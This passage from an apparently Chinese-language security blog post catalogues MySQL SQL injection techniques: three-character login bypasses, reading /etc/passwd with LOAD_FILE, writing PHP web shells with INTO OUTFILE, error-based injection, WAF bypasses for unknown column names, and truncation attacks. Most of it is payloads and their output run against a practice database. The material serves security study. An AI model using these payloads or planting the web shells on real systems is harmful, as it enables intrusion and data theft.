nlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200703150718337.png" alt="image-20200703150718337"></p>
<p>异或会使字符串都转为浮点数，都变为了0，由于0&#x3D;0^0 -&gt; 1^0 -&gt; 1<br>当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多<br>还有就是构造的payload比较简短，例如<code>&#39;+&#39;、&#39;^&#39;、&#39;/4#</code>这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p>
<h3 id="1-6、结合盲注"><a href="#1-6、结合盲注" class="headerlink" title="1.6、结合盲注"></a>1.6、结合盲注</h3><p>这里false注入如果是在一些非验证的地方利用的地方基本是需要盲注，姿势比较多</p>
<h2 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h2><p>在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE()</p>
<p>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</p>
<p>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所以是将这个功能禁掉了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>

<h3 id="2-1、读文件"><a href="#2-1、读文件" class="headerlink" title="2.1、读文件"></a>2.1、读文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读文件函数LOAD_FILE()</span><br><span class="line">SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;);</span><br><span class="line">SELECT LOAD_FILE(0x2F6574632F706173737764);</span><br></pre></td></tr></table></figure>

<p>注意点：</p>
<ol>
<li>LOAD_FILE的默认目录@@datadir</li>
<li>文件必须是当前用户可读</li>
<li>读文件最大的为1047552个byte, @@max_allowed_packet可以查看文件读取最大值</li>
</ol>
<h3 id="2-2、写文件"><a href="#2-2、写文件" class="headerlink" title="2.2、写文件"></a>2.2、写文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">INTO OUTFILE/DUMPFILE</span><br><span class="line">SELECT &#x27;&lt;? system($_GET[&#x27;c&#x27;]); ?&gt;&#x27; INTO OUTFILE &#x27;/var/www/shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">这两个函数都可以写文件，但是有很大的差别 </span><br><span class="line"></span><br><span class="line">INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 </span><br><span class="line">INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 </span><br></pre></td></tr></table></figure>

<p>注意点：</p>
<ol>
<li>INTO OUTFILE不会覆盖文件</li>
<li>INTO OUTFILE必须是查询语句的最后一句</li>
<li>路径名是不能编码的，必须使用单引号<br>创建数据库导出一句话后门，secure_file_priv 需要开启</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`test` (`temp` TEXT NOT NULL );</span><br><span class="line">Query OK, 0 rows affected (0.12 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO `mysql`.`test` (`temp` ) VALUES(&#x27;&lt;?php @eval($_POST[test]);?&gt;&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| temp                              |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| &lt;?php @eval($_POST[test]);?&gt; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">SELECT `temp` FROM `test` INTO OUTFILE &#x27;E:/123.php&#x27;;</span><br><span class="line">DROP TABLE IF EXISTS `test`;</span><br></pre></td></tr></table></figure>

<h3 id="2-4、正则绕过"><a href="#2-4、正则绕过" class="headerlink" title="2.4、正则绕过"></a>2.4、正则绕过</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-4509370c5a20340c.png" alt="图片.png"></p>
<h3 id="2-6、特殊字符绕过空格"><a href="#2-6、特殊字符绕过空格" class="headerlink" title="2.6、特殊字符绕过空格"></a>2.6、特殊字符绕过空格</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-ff91607134d5255c.png" alt="图片.png"></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">floor报错</span><br><span class="line">有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</span><br><span class="line">（没有floor和rand函数也是不会报错的）</span><br><span class="line">mysql&gt; select count(*),concat(0x3a,database(),0x3a,floor(rand()*2))a from information_schema.tables </span><br><span class="line">group by a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;:security:1&#x27; for key &#x27;group_key&#x27;</span><br><span class="line"></span><br><span class="line">UpdateXml报错注入</span><br><span class="line">mysql&gt; select updatexml(0,concat(0x7e,(select database())),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~security&#x27;</span><br><span class="line"></span><br><span class="line">extractvalue报错注入</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x5c,(select database())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;\security&#x27;</span><br><span class="line"></span><br><span class="line">Error based Double Query Injection</span><br><span class="line">mysql&gt; select * from users where id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.5.53~1&#x27; for key &#x27;group_key&#x27;</span><br><span class="line"></span><br><span class="line">当一个库中不存在的自定义函数他就会爆出当前库中没有此函数，从而爆出数据库名。</span><br><span class="line">mysql&gt; select username,phone from info where id=f();</span><br><span class="line">ERROR 1305 (42000): FUNCTION security.f does not exist</span><br><span class="line"></span><br><span class="line">Polygon,linestring爆表名，库名</span><br><span class="line">mysql&gt; select username,phone from info where id=1 and Polygon(id);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`security`.`info`.`id`&#x27; value found during parsing</span><br><span class="line">mysql&gt; select username,phone from info where id=1 and linestring(id);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`security`.`info`.`id`&#x27; value found during parsing</span><br><span class="line"></span><br><span class="line">                                                                exp()</span><br><span class="line">select * from users where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<h2 id="绕过未知字段名的技巧"><a href="#绕过未知字段名的技巧" class="headerlink" title="绕过未知字段名的技巧"></a>绕过未知字段名的技巧</h2><p>waf拦截了information_schema、columns、tables、database、schema等关键字或函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">..............</span><br><span class="line"></span><br><span class="line">mysql&gt; select `3` from (select 1,2,3 union select * from users)a limit 1,1;</span><br><span class="line">+------+</span><br><span class="line">| 3    |</span><br><span class="line">+------+</span><br><span class="line">| Dumb |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select `1`,`2`,`3` from (select 1,2,3 union select * from users)a limit 2,1;</span><br><span class="line">+---+----------+------------+</span><br><span class="line">| 1 | 2        | 3          |</span><br><span class="line">+---+----------+------------+</span><br><span class="line">| 2 | Angelina | I-kill-you |</span><br><span class="line">+---+----------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select 1)a,(select 2)b,(select 3)c,(select 4)d;</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| a | b | c | d |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| 1 | 2 | 3 | 4 |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| 1 | 2 | 3 | 4 |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| 1 | 2 | 3 | 4 |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">| Dumb       |</span><br><span class="line">| I-kill-you |</span><br><span class="line">| p@ssword   |</span><br><span class="line">+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 3;</span><br><span class="line">+----------+</span><br><span class="line">| 3        |</span><br><span class="line">+----------+</span><br><span class="line">| p@ssword |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=1 union select (select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 3)f,(select 1)g,(select 1)h;</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">| id       | username | password |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">| 1        | Dumb     | Dumb     |</span><br><span class="line">| p@ssword | 1        | 1        |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>如果不允许使用union</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b)</span><br><span class="line">as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line">利用using爆其他字段</span><br><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b </span><br><span class="line">using(id))as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b</span><br><span class="line">using(id,username))as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</strong><br><a target="_blank" rel="noopener" href="http://www.mamicode.com/info-detail-138723.html">详解mysql中的Using与On的用法</a></p>
<h2 id="使用Join查询"><a href="#使用Join查询" class="headerlink" title="使用Join查询"></a>使用Join查询</h2><p><strong>在联合查询的时候，查询填充的列分割较多时，就会被waf拦截</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="Mysql约束攻击"><a href="#Mysql约束攻击" class="headerlink" title="Mysql约束攻击"></a>Mysql约束攻击</h2><p><strong>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）<br>在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  create table user(id int primary key,user varchar(10),pwd varchar(20));</span><br><span class="line">Query OK, 0 rows affected (0.38 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into user value(1,&#x27;admin&#x27;,&#x27;123&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into user value(2,&#x27;admin          &#x27;,&#x27;456&#x27;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">+----+------------+------+</span><br><span class="line">| id | user       | pwd  |</span><br><span class="line">+----+------------+------+</span><br><span class="line">|  2 | admin      | 456  |</span><br><span class="line">|  1 | admin      | 123  |</span><br><span class="line">+----+------------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(user) from user;</span><br><span class="line">+--------------+</span><br><span class="line">| length(user) |</span><br><span class="line">+--------------+</span><br><span class="line">|           10 |</span><br><span class="line">|            5 |</span><br><span class="line">+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line">长度是不一样的,但是在受影响的版本中,id=2的user值admin          在前端登录处登录并且在后端验证中,admin</span><br><span class="line">是等同id=1的user值admin的.</span><br></pre></td></tr></table></figure>

